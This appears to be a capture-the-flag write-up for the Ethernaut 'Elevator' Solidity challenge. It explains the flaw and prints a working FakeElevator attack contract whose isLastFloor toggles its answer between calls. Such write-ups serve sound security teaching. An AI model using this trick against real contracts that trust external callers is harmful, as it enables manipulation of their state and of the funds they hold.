# Requirements

- This elevator won't let you reach the top of your building. Right?

# Attack explanation

We can control the address from which the Building instance is created.

What we are going to do is to create our own Building contract and implement isLastFloor following with a similar structure but different behaviour. To solve the challenge, we must make the function return false when it is run the first time and then it should return true if run a second time, all within a single call to the goTo function.

# Attack function

We could solve the challenge by just using the following attack proxy sc:

```
contract FakeElevator {
  bool public toggle = true;
  Elevator public elev;

  constructor(address _target) {
      elev = Elevator(_target);
  }

  function isLastFloor(uint256) public returns (bool) {
      toggle = !toggle;
      return toggle;
  }

  function setTop(uint256 _floor) public {
      elev.goTo(_floor);
  }
}
```
